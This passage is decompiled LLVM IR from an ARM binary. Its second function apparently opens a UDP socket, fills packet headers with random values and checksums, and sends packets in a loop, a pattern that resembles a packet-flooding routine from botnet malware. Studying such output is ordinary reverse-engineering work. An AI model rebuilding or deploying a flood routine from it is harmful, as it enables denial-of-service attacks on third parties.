  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 %v1_b388, i8* %v4_b388, align 1
  %v0_b38c = load i32, i32* %r1.global-to-local, align 4
  %v1_b38c = trunc i32 %v0_b38c to i8
  %v2_b38c = load i32, i32* %r4.global-to-local, align 4
  %v3_b38c = add i32 %v2_b38c, 57
  %v4_b38c = inttoptr i32 %v3_b38c to i8*
  store i8 %v1_b38c, i8* %v4_b38c, align 1
  %v3_b390 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b390, i32* %r3.global-to-local, align 4
  %v1_b394 = load i32, i32* %r2.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, %v3_b390
  store i32 %v2_b394, i32* @r4, align 4
  %v1_b398 = load i32, i32* @r7, align 4
  %v9_b398 = icmp eq i32 %v2_b394, %v1_b398
  store i1 %v9_b398, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b394, i32* %stack_var_-44, align 4
  %v5_b3a0 = icmp slt i32 %v2_b394, %v1_b398
  br i1 %v5_b3a0, label %dec_label_pc_b1e8, label %dec_label_pc_b3a4.preheader

dec_label_pc_b3a4.preheader:                      ; preds = %bb61, %dec_label_pc_b118
  %v0_b3a86 = phi i32 [ 0, %dec_label_pc_b118 ], [ %v1_b398, %bb61 ]
  %v3_b520 = icmp eq i32 %v6_b0cc, -1
  %v8_b520 = icmp eq i32 %v6_b0cc, -1
  %v3_b3f0 = icmp eq i32 %v3_b134, 65535
  br label %dec_label_pc_b3a4

dec_label_pc_b3a4:                                ; preds = %dec_label_pc_b3a4, %dec_label_pc_b4b4, %dec_label_pc_b3a4.preheader
  %v0_b3a8 = phi i32 [ %v0_b3a86, %dec_label_pc_b3a4.preheader ], [ 0, %dec_label_pc_b4b4 ], [ 0, %dec_label_pc_b3a4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3a8 = icmp eq i32 %v0_b3a8, 0
  store i1 %v2_b3a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3a8, label %dec_label_pc_b3a4, label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b3a4, %dec_label_pc_b4b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3b8

dec_label_pc_b3b8:                                ; preds = %dec_label_pc_b430, %dec_label_pc_b3b4
  %v1_b3c8 = phi i32 [ %v1_b4a4, %dec_label_pc_b430 ], [ 0, %dec_label_pc_b3b4 ]
  %v5_b3bc = mul i32 %v1_b3c8, 24
  %v1_b3c0 = load i32, i32* @r8, align 4
  %v2_b3c0 = add i32 %v1_b3c0, %v5_b3bc
  store i32 %v2_b3c0, i32* %r3.global-to-local, align 4
  %v1_b3c4 = add i32 %v2_b3c0, 20
  %v2_b3c4 = inttoptr i32 %v1_b3c4 to i8*
  %v3_b3c4 = load i8, i8* %v2_b3c4, align 1
  %v4_b3c4 = zext i8 %v3_b3c4 to i32
  store i32 %v4_b3c4, i32* %r2.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @sb, align 4
  %v4_b3c8 = mul i32 %v1_b3c8, 4
  %v5_b3c8 = add i32 %v0_b3c8, %v4_b3c8
  %v6_b3c8 = inttoptr i32 %v5_b3c8 to i32*
  %v7_b3c8 = load i32, i32* %v6_b3c8, align 4
  store i32 %v7_b3c8, i32* @r5, align 4
  %v7_b3cc = icmp eq i8 %v3_b3c4, 31
  store i1 %v7_b3cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b3d0 = add i32 %v7_b3c8, 20
  store i32 %v1_b3d0, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b3c4, 32
  br i1 %tmp67, label %dec_label_pc_b4c8, label %dec_label_pc_b3d8

dec_label_pc_b3d8:                                ; preds = %dec_label_pc_b3b8
  store i32 %v6_b0cc, i32* %r3.global-to-local, align 4
  store i1 %v8_b520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b520, label %dec_label_pc_b528, label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b4c8, %dec_label_pc_b3d8
  store i32 %v3_b134, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_b3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b3f0, label %dec_label_pc_b544, label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b528, %dec_label_pc_b3e4
  %v1_b3fc = phi i32 [ %v1_b538, %dec_label_pc_b528 ], [ 65535, %dec_label_pc_b3e4 ]
  store i32 %v3_b138, i32* %r1.global-to-local, align 4
  %v9_b3fc = icmp eq i32 %v3_b138, %v1_b3fc
  store i1 %v9_b3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b3fc, label %dec_label_pc_b558, label %dec_label_pc_b404

dec_label_pc_b404:                                ; preds = %dec_label_pc_b544.dec_label_pc_b404_crit_edge, %dec_label_pc_b3f8
  %v1_b408 = phi i32 [ %v1_b408.pre, %dec_label_pc_b544.dec_label_pc_b404_crit_edge ], [ %v1_b3fc, %dec_label_pc_b3f8 ]
  store i32 %v3_b13c, i32* %r2.global-to-local, align 4
  %v9_b408 = icmp eq i32 %v3_b13c, %v1_b408
  store i1 %v9_b408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b408, label %dec_label_pc_b56c, label %dec_label_pc_b410

dec_label_pc_b410:                                ; preds = %dec_label_pc_b558.dec_label_pc_b410_crit_edge, %dec_label_pc_b404
  %v1_b414 = phi i32 [ %v1_b414.pre, %dec_label_pc_b558.dec_label_pc_b410_crit_edge ], [ %v1_b408, %dec_label_pc_b404 ]
  store i32 %v6_b008, i32* %r3.global-to-local, align 4
  %v9_b414 = icmp eq i32 %v6_b008, %v1_b414
  store i1 %v9_b414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b414, label %dec_label_pc_b580, label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b56c.dec_label_pc_b41c_crit_edge, %dec_label_pc_b410
  %v1_b420 = phi i32 [ %v1_b420.pre, %dec_label_pc_b56c.dec_label_pc_b41c_crit_edge ], [ %v1_b414, %dec_label_pc_b410 ]
  store i32 %v6_b020, i32* %r0.global-to-local, align 4
  %v9_b420 = icmp eq i32 %v6_b020, %v1_b420
  store i1 %v9_b420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b420, label %dec_label_pc_b594, label %dec_label_pc_b428

dec_label_pc_b428:                                ; preds = %dec_label_pc_b580, %dec_label_pc_b41c
  %v0_b428 = load i32, i32* @fp, align 4
  %v2_b428 = icmp eq i32 %v0_b428, 0
  store i1 %v2_b428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b428, label %dec_label_pc_b430, label %dec_label_pc_b5a4

dec_label_pc_b430:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b594, %dec_label_pc_b5a4
  %v2_b434 = load i32, i32* @r5, align 4
  %v3_b434 = add i32 %v2_b434, 10
  %v4_b434 = inttoptr i32 %v3_b434 to i16*
  store i16 0, i16* %v4_b434, align 2
  %v0_b438 = load i32, i32* @r5, align 4
  store i32 %v0_b438, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b440 = call i32 @function_c848(i32 %v0_b438, i32 20)
  %v3_b440 = trunc i32 %v2_b440 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b448 = load i32, i32* @r5, align 4
  %v4_b448 = add i32 %v3_b448, 10
  %v5_b448 = inttoptr i32 %v4_b448 to i16*
  store i16 %v3_b440, i16* %v5_b448, align 2
  %v0_b44c = load i32, i32* @r6, align 4
  store i32 %v0_b44c, i32* @r1, align 4
  %v0_b450 = load i32, i32* %r2.global-to-local, align 4
  %v1_b450 = trunc i32 %v0_b450 to i16
  %v3_b450 = add i32 %v0_b44c, 16
  %v4_b450 = inttoptr i32 %v3_b450 to i16*
  store i16 %v1_b450, i16* %v4_b450, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r0.global-to-local, align 4
  %v4_b460 = call i32 @function_c898(i32 %v0_b45c, i32 %v0_b44c, i32 10240, i32 40)
  %v5_b460 = trunc i32 %v4_b460 to i16
  store i32 %v4_b460, i32* %r0.global-to-local, align 4
  %v3_b464 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b464, i32* %r3.global-to-local, align 4
  %v3_b468 = mul i32 %v3_b464, 32
  store i32 %v3_b468, i32* %lr.global-to-local, align 4
  %v3_b46c = load i32, i32* @r6, align 4
  %v4_b46c = add i32 %v3_b46c, 16
  %v5_b46c = inttoptr i32 %v4_b46c to i16*
  store i16 %v5_b460, i16* %v5_b46c, align 2
  %v0_b470 = load i32, i32* %lr.global-to-local, align 4
  %v1_b470 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b470, -8
  %v5_b470 = add i32 %v0_b470, %tmp68
  store i32 %v5_b470, i32* %lr.global-to-local, align 4
  %v0_b474 = load i32, i32* @r6, align 4
  %v1_b474 = add i32 %v0_b474, 2
  %v2_b474 = inttoptr i32 %v1_b474 to i16*
  %v3_b474 = load i16, i16* %v2_b474, align 2
  %v1_b478 = load i32, i32* @r8, align 4
  %v2_b478 = add i32 %v1_b478, %v5_b470
  store i32 %v2_b478, i32* @lr, align 4
  %v3_b47c = add i32 %v2_b478, 2
  %v4_b47c = inttoptr i32 %v3_b47c to i16*
  store i16 %v3_b474, i16* %v4_b47c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r5, align 4
  store i32 %v0_b488, i32* %r1.global-to-local, align 4
  %v0_b48c = load i32, i32* @sl, align 4
  store i32 %v0_b48c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b494 = load i32, i32* @lr, align 4
  %v6_b49c = call i32 @function_11560(i32 %v0_b48c, i32 %v0_b488, i32 60, i32 16384, i32 %v0_b494, i32 16)
  %v3_b4a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a0, i32* %r3.global-to-local, align 4
  %v1_b4a4 = add i32 %v3_b4a0, 1
  store i32 %v1_b4a4, i32* %r0.global-to-local, align 4
  %v1_b4a8 = load i32, i32* @r7, align 4
  %v9_b4a8 = icmp eq i32 %v1_b4a4, %v1_b4a8
  store i1 %v9_b4a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4a4, i32* %stack_var_-44, align 4
  %v5_b4b0 = icmp slt i32 %v1_b4a4, %v1_b4a8
  br i1 %v5_b4b0, label %dec_label_pc_b3b8, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b430
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4b8 = icmp eq i32 %v1_b4a8, 0
  store i1 %v2_b4b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4b8, label %dec_label_pc_b3a4, label %dec_label_pc_b3b4

dec_label_pc_b4c8:                                ; preds = %dec_label_pc_b3b8
  %v1_b4c8 = add i32 %v2_b3c0, 16
  %v2_b4c8 = inttoptr i32 %v1_b4c8 to i32*
  %v3_b4c8 = load i32, i32* %v2_b4c8, align 4
  store i32 %v3_b4c8, i32* %r4.global-to-local, align 4
  %v0_b4cc = call i32 @function_e0b4()
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  %v3_b4d0 = load i32, i32* %stack_var_-44, align 4
  %v5_b4d8 = mul i32 %v3_b4d0, 24
  %v0_b4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_b4dc = and i32 %v0_b4dc, 16711680
  %v3_b4e0 = udiv i32 %v0_b4dc, 16777216
  %v4_b4e4 = udiv i32 %v1_b4dc, 256
  %v5_b4e4 = or i32 %v4_b4e4, %v3_b4e0
  store i32 %v5_b4e4, i32* %r2.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r8, align 4
  %v2_b4e8 = add i32 %v1_b4e8, %v5_b4d8
  store i32 %v2_b4e8, i32* %r1.global-to-local, align 4
  %v1_b4ec = and i32 %v0_b4dc, 65280
  store i32 %v1_b4ec, i32* %r3.global-to-local, align 4
  %v1_b4f0 = add i32 %v2_b4e8, 20
  %v2_b4f0 = inttoptr i32 %v1_b4f0 to i8*
  %v3_b4f0 = load i8, i8* %v2_b4f0, align 1
  %v4_b4f0 = zext i8 %v3_b4f0 to i32
  %v5_b4f8 = call i32 @llvm.bswap.i32(i32 %v0_b4dc)
  %v7_b4fc = lshr i32 %v0_b4cc, %v4_b4f0
  %v8_b4fc = add i32 %v7_b4fc, %v5_b4f8
  store i32 %v8_b4fc, i32* %r2.global-to-local, align 4
  %v1_b500 = and i32 %v8_b4fc, 16711680
  store i32 %v1_b500, i32* %r0.global-to-local, align 4
  %v1_b50c = and i32 %v8_b4fc, 65280
  store i32 %v1_b50c, i32* %r1.global-to-local, align 4
  %v5_b514 = call i32 @llvm.bswap.i32(i32 %v8_b4fc)
  %v1_b518 = load i32, i32* @r5, align 4
  %v2_b518 = add i32 %v1_b518, 16
  %v3_b518 = inttoptr i32 %v2_b518 to i32*
  store i32 %v5_b514, i32* %v3_b518, align 4
  store i32 %v6_b0cc, i32* %r3.global-to-local, align 4
  store i1 %v8_b520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b520, label %dec_label_pc_b528, label %dec_label_pc_b3e4

dec_label_pc_b528:                                ; preds = %dec_label_pc_b4c8, %dec_label_pc_b3d8
  %v0_b528 = call i32 @function_e0b4()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_b530 = load i32, i32* @r5, align 4
  %v2_b530 = add i32 %v1_b530, 12
  %v3_b530 = inttoptr i32 %v2_b530 to i32*
  store i32 %v0_b528, i32* %v3_b530, align 4
  store i32 %v3_b134, i32* %r0.global-to-local, align 4
  %v0_b538 = load i32, i32* %r4.global-to-local, align 4
  %v1_b538 = add i32 %v0_b538, -1
  store i32 %v1_b538, i32* @r4, align 4
  %v9_b53c = icmp eq i32 %v3_b134, %v1_b538
  store i1 %v9_b53c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b53c, label %dec_label_pc_b544, label %dec_label_pc_b3f8

dec_label_pc_b544:                                ; preds = %dec_label_pc_b528, %dec_label_pc_b3e4
  %v0_b544 = call i32 @function_e0b4()
  %v1_b544 = trunc i32 %v0_b544 to i16
  store i32 %v0_b544, i32* %r0.global-to-local, align 4
  store i32 %v3_b138, i32* %r1.global-to-local, align 4
  %v1_b54c = load i32, i32* @r4, align 4
  %v9_b54c = icmp eq i32 %v3_b138, %v1_b54c
  store i1 %v9_b54c, i1* %cpsr_z.global-to-local, align 1
  %v3_b550 = load i32, i32* @r5, align 4
  %v4_b550 = add i32 %v3_b550, 4
  %v5_b550 = inttoptr i32 %v4_b550 to i16*
  store i16 %v1_b544, i16* %v5_b550, align 2
  br i1 %v9_b54c, label %dec_label_pc_b558, label %dec_label_pc_b544.dec_label_pc_b404_crit_edge

dec_label_pc_b544.dec_label_pc_b404_crit_edge:    ; preds = %dec_label_pc_b544
  %v1_b408.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b404

dec_label_pc_b558:                                ; preds = %dec_label_pc_b544, %dec_label_pc_b3f8
  %v0_b558 = call i32 @function_e0b4()
  %v1_b558 = trunc i32 %v0_b558 to i16
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  store i32 %v3_b13c, i32* %r2.global-to-local, align 4
  %v1_b560 = load i32, i32* @r4, align 4
  %v9_b560 = icmp eq i32 %v3_b13c, %v1_b560
  store i1 %v9_b560, i1* %cpsr_z.global-to-local, align 1
  %v3_b564 = load i32, i32* @r5, align 4
  %v4_b564 = add i32 %v3_b564, 20
  %v5_b564 = inttoptr i32 %v4_b564 to i16*
  store i16 %v1_b558, i16* %v5_b564, align 2
  br i1 %v9_b560, label %dec_label_pc_b56c, label %dec_label_pc_b558.dec_label_pc_b410_crit_edge

dec_label_pc_b558.dec_label_pc_b410_crit_edge:    ; preds = %dec_label_pc_b558
  %v1_b414.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b410

dec_label_pc_b56c:                                ; preds = %dec_label_pc_b558, %dec_label_pc_b404
  %v0_b56c = call i32 @function_e0b4()
  %v1_b56c = trunc i32 %v0_b56c to i16
  store i32 %v0_b56c, i32* %r0.global-to-local, align 4
  store i32 %v6_b008, i32* %r3.global-to-local, align 4
  %v1_b574 = load i32, i32* @r4, align 4
  %v9_b574 = icmp eq i32 %v6_b008, %v1_b574
  store i1 %v9_b574, i1* %cpsr_z.global-to-local, align 1
  %v3_b578 = load i32, i32* @r6, align 4
  %v4_b578 = add i32 %v3_b578, 2
  %v5_b578 = inttoptr i32 %v4_b578 to i16*
  store i16 %v1_b56c, i16* %v5_b578, align 2
  br i1 %v9_b574, label %dec_label_pc_b580, label %dec_label_pc_b56c.dec_label_pc_b41c_crit_edge

dec_label_pc_b56c.dec_label_pc_b41c_crit_edge:    ; preds = %dec_label_pc_b56c
  %v1_b420.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b41c

dec_label_pc_b580:                                ; preds = %dec_label_pc_b56c, %dec_label_pc_b410
  %v0_b580 = call i32 @function_e0b4()
  %v1_b584 = load i32, i32* @r6, align 4
  %v2_b584 = add i32 %v1_b584, 4
  %v3_b584 = inttoptr i32 %v2_b584 to i32*
  store i32 %v0_b580, i32* %v3_b584, align 4
  store i32 %v6_b020, i32* %r0.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v6_b020, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b58c, label %dec_label_pc_b594, label %dec_label_pc_b428

dec_label_pc_b594:                                ; preds = %dec_label_pc_b580, %dec_label_pc_b41c
  %v0_b594 = call i32 @function_e0b4()
  store i32 %v0_b594, i32* %r0.global-to-local, align 4
  %v0_b598 = load i32, i32* @fp, align 4
  %v2_b598 = icmp eq i32 %v0_b598, 0
  store i1 %v2_b598, i1* %cpsr_z.global-to-local, align 1
  %v1_b59c = load i32, i32* @r6, align 4
  %v2_b59c = add i32 %v1_b59c, 8
  %v3_b59c = inttoptr i32 %v2_b59c to i32*
  store i32 %v0_b594, i32* %v3_b59c, align 4
  br i1 %v2_b598, label %dec_label_pc_b430, label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b594
  %v0_b5a4 = call i32 @function_e0b4()
  %v1_b5a4 = trunc i32 %v0_b5a4 to i16
  store i32 %v0_b5a4, i32* %r0.global-to-local, align 4
  %v3_b5a8 = load i32, i32* @r6, align 4
  %v4_b5a8 = add i32 %v3_b5a8, 18
  %v5_b5a8 = inttoptr i32 %v4_b5a8 to i16*
  store i16 %v1_b5a4, i16* %v5_b5a8, align 2
  br label %dec_label_pc_b430

dec_label_pc_b5b0:                                ; preds = %dec_label_pc_b0f0
  %v0_b5b0 = load i32, i32* @sl, align 4
  store i32 %v0_b5b0, i32* %r0.global-to-local, align 4
  %v1_b5b4 = call i32 @function_10dd8(i32 %v0_b5b0)
  store i32 %v1_b5b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5b8

dec_label_pc_b5b8:                                ; preds = %dec_label_pc_af1c, %dec_label_pc_b5b0
  %v1_b5c0 = phi i32 [ %v3_b0e0, %dec_label_pc_af1c ], [ %v1_b5b4, %dec_label_pc_b5b0 ]
  store i32 %v3_af1c, i32* %r4.global-to-local, align 4
  store i32 %v24_af1c, i32* %fp.global-to-local, align 4
  store i32 %v27_af1c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b5c0

; uselistorder directives
  uselistorder i32 %v0_b5a4, { 1, 0 }
  uselistorder i32 %v0_b56c, { 1, 0 }
  uselistorder i32 %v0_b558, { 1, 0 }
  uselistorder i32 %v0_b544, { 1, 0 }
  uselistorder i32 %v1_b538, { 1, 2, 0 }
  uselistorder i32 %v0_b4dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b4a4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b470, { 1, 0 }
  uselistorder i32 %v4_b460, { 1, 0 }
  uselistorder i1 %v3_b3f0, { 1, 0 }
  uselistorder i32 %v2_b394, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b1fc, { 1, 2, 0 }
  uselistorder i32 %v1_b1c8, { 2, 1, 0 }
  uselistorder i32 %v1_b1c4, { 2, 0, 1 }
  uselistorder i32 %v1_b1c0, { 2, 0, 1 }
  uselistorder i32 %v1_b1bc, { 2, 0, 1 }
  uselistorder i32 %v1_b198, { 1, 0 }
  uselistorder i32 %v3_b134, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b128, { 1, 0, 2 }
  uselistorder i32 %v0_b124, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b110, { 1, 0 }
  uselistorder i1 %v7_b0e4, { 1, 0 }
  uselistorder i32 %v3_b0e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b0cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b020, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_b008, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_af94, { 1, 0 }
  uselistorder i32 %v6_af8c, { 1, 0 }
  uselistorder i32 %v7_af74, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 5, 3, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5b8, { 1, 0 }
  uselistorder label %dec_label_pc_b5a4, { 1, 0 }
  uselistorder label %dec_label_pc_b430, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b3a4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_b5c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b5c8:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_b5c8 = load i32, i32* @r4, align 4
  %v18_b5c8 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b5e4 = call i32 @function_1214c(i32 %arg1, i32 4)
  store i32 %v2_b5e4, i32* @sl, align 4
  %v0_b5f0 = load i32, i32* @r7, align 4
  %v2_b5f4 = call i32 @function_1214c(i32 %v0_b5f0, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_b600 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_b5f4, i32* @r8, align 4
  %v0_b610 = load i32, i32* @r5, align 4
  %v5_b614 = inttoptr i32 %v0_b600 to i32*
  %v6_b614 = call i32 @function_8570(i32 %v0_b610, i32* %v5_b614, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_b61c = urem i32 %v6_b614, 65536
  %v0_b620 = load i32, i32* @r6, align 4
  %v0_b628 = load i32, i32* @r4, align 4
  store i32 %v0_b628, i32* %r3.global-to-local, align 4
  %v0_b62c = load i32, i32* @r5, align 4
  %v5_b634 = inttoptr i32 %v0_b620 to i32*
  %v6_b634 = call i32 @function_8570(i32 %v0_b62c, i32* %v5_b634, i32 6, i32 %v0_b628, i32 %v3_b61c)
  %v0_b638 = load i32, i32* @r6, align 4
  %v3_b63c = mul i32 %v6_b634, 65536
  store i32 %v3_b63c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b648 = load i32, i32* @r5, align 4
  %v5_b64c = inttoptr i32 %v0_b638 to i32*
  %v6_b64c = call i32 @function_8570(i32 %v0_b648, i32* %v5_b64c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b65c = load i32, i32* @r6, align 4
  %v0_b660 = load i32, i32* @r5, align 4
  %v3_b664 = urem i32 %v6_b64c, 65536
  store i32 %v3_b664, i32* @r5, align 4
  %v5_b668 = inttoptr i32 %v0_b65c to i32*
  %v6_b668 = call i32 @function_8570(i32 %v0_b660, i32* %v5_b668, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b66c = load i32, i32* %sb.global-to-local, align 4
  %v3_b66c = udiv i32 %v0_b66c, 65536
  store i32 %v3_b66c, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b674 = load i32, i32* @r4, align 4
  %v9_b674 = icmp eq i32 %v3_b66c, %v1_b674
  br i1 %v9_b674, label %dec_label_pc_b6a4, label %bb

bb:                                               ; preds = %dec_label_pc_b5c8
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b68c = udiv i32 %v0_b66c, 16777216
  store i32 %v4_b68c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6b4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b5c8
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6a4 = call i32 @function_e0b4()
  br label %dec_label_pc_b6b4

dec_label_pc_b6b4:                                ; preds = %bb, %dec_label_pc_b6a4
  %v0_b69810 = urem i32 %v6_b668, 256
  %v0_b6b4 = load i32, i32* @r7, align 4
  %v2_b6b4 = icmp eq i32 %v0_b6b4, 0
  br i1 %v2_b6b4, label %dec_label_pc_b7f4, label %dec_label_pc_b6bc

dec_label_pc_b6bc:                                ; preds = %dec_label_pc_b6b4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b768 = udiv i32 %v3_b61c, 256
  %v1_b764 = mul i32 %v6_b614, 256
  %v4_b76c = and i32 %v1_b764, 65280
  %v5_b76c = or i32 %v4_b76c, %v3_b768
  %v2_b6ec = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b74c

dec_label_pc_b6cc:                                ; preds = %bb51, %dec_label_pc_b78c
  %v3_b6d8 = call i32 @function_115e4(i32 2, i32 2, i32 17)
  %v7_b6e0 = icmp eq i32 %v3_b6d8, -1
  %v0_b6e4 = load i32, i32* @sb, align 4
  %v1_b6e4 = add i32 %v0_b6e4, 1
  store i32 %v1_b6e4, i32* @sb, align 4
  %v0_b6e8 = load i32, i32* @fp, align 4
  %v1_b6e8 = add i32 %v0_b6e8, 24
  store i32 %v1_b6e8, i32* @fp, align 4
  %v2_b6f4 = load i32, i32* @r8, align 4
  %v3_b6f4 = add i32 %v2_b6f4, %stack_var_-60.0
  %v4_b6f4 = inttoptr i32 %v3_b6f4 to i32*
  store i32 %v3_b6d8, i32* %v4_b6f4, align 4
  br i1 %v7_b6e0, label %dec_label_pc_b7e8, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6cc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b714 = call i32 @function_11394(i32 %v3_b6d8, i32 %v2_b6ec, i32 16)
  %v0_b718 = load i32, i32* @r6, align 4
  %v1_b718 = add i32 %v0_b718, 20
  %v2_b718 = inttoptr i32 %v1_b718 to i8*
  %v3_b718 = load i8, i8* %v2_b718, align 1
  %v4_b718 = zext i8 %v3_b718 to i32
  store i32 %v4_b718, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b718, 32
  br i1 %tmp, label %dec_label_pc_b7a0, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b6fc, %dec_label_pc_b7a0
  %v0_b728 = phi i32 [ %v0_b718, %dec_label_pc_b6fc ], [ %v0_b728.pre, %dec_label_pc_b7a0 ]
  %v1_b72c = load i32, i32* @r8, align 4
  %v2_b72c = add i32 %v1_b72c, %stack_var_-60.0
  %v3_b72c = inttoptr i32 %v2_b72c to i32*
  %v4_b72c = load i32, i32* %v3_b72c, align 4
